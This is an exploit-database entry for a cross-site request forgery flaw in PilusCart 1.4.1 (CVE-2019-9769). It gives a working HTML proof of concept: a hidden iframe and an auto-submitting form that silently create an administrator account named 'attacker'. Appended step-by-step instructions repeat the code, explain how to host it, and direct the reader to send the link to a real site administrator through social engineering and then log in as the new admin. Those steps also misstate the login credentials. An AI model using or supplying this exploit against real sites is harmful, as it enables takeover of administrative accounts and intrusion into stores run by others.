# Exploit Title: PilusCart 1.4.1 - Cross-Site Request Forgery (Add Admin)
# Google Dork: N/A
# Date: 10-03-2019
# Exploit Author: Gionathan "John" Reale
# Vendor Homepage: https://github.com/piluscart
# Software Link: https://sourceforge.net/projects/pilus/files/PiLUS/1.4.1/PiLUS-1.4.1-Ubiungu-stable.zip/download
# Version: 1.4.1
# Tested on: ParrotOS
# CVE : 2019-9769

PilusCart 1.4.1 is vulnerable to CSRF attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), a form will be submitted that will add a new user as administrator.


PoC:


<html>
<iframe style="width:0;height:0;border:0; border:none;" name="csrf-frame"></iframe>

<form name="adduser" action="http://server/cabin/index.php?module=users&action=newUser" method="post" target="csrf-frame">
    <input type="submit">
    <input type="hidden" name="admin_id" value="">
    <input type="hidden" name="session_id" value="">
    <input type="hidden" name="admin_login" value="attacker">
    <input type="hidden" name="admin_fullname" value="attacker">
    <input type="hidden" name="admin_email" value="admin@attacker.com">
    <input type="hidden" name="admin_pass" value="admin">
    <input type="hidden" name="confirm_pass" value="admin">
    <input type="hidden" name="admin_level" value="admin">
    <input type="hidden" name="admin_url" value="">
    <input type="hidden" name="saveAdmin" value="Simpan">
        
</form>

<script>
document.forms.adduser.submit();
</script>
</html>



Instructions:


Prepare the Exploit
Create the Exploit HTML File:

Open a text editor and create a new file named csrf_add_admin.html.

Copy and paste the following HTML code into csrf_add_admin.html:
<html>
  <iframe style="width:0;height:0;border:0; border:none;" name="csrf-frame"></iframe>
  <form name="adduser" action="http://server/cabin/index.php?module=users&action=newUser" method="post" target="csrf-frame">
    <input type="submit">
    <input type="hidden" name="admin_id" value="">
    <input type="hidden" name="session_id" value="">
    <input type="hidden" name="admin_login" value="attacker">
    <input type="hidden" name="admin_fullname" value="attacker">
    <input type="hidden" name="admin_email" value="admin@attacker.com">
    <input type="hidden" name="admin_pass" value="admin">
    <input type="hidden" name="confirm_pass" value="admin">
    <input type="hidden" name="admin_level" value="admin">
    <input type="hidden" name="admin_url" value="">
    <input type="hidden" name="saveAdmin" value="Simpan">
  </form>
  <script>
    document.forms.adduser.submit();
  </script>
</html>

Save the file.

Host the csrf_add_admin.html file on a web server. You can use a simple HTTP server for this. For example, using Python:python3 -m http.server 8000

This will serve the file at http://localhost:8000/csrf_add_admin.html.


Open a browser and navigate to the hosted exploit file URL, e.g., http://localhost:8000/csrf_add_admin.html.
Also, send this URL to an administrator of the PilusCart site.

If the administrator is logged into PilusCart and visits the URL, the form will be submitted automatically, adding the attacker as an admin with the credentials provided in the form.

Log in to PilusCart using the new admin credentials (attacker / admin@attacker.com).

The new admin user has been successfully created and has administrative privileges.
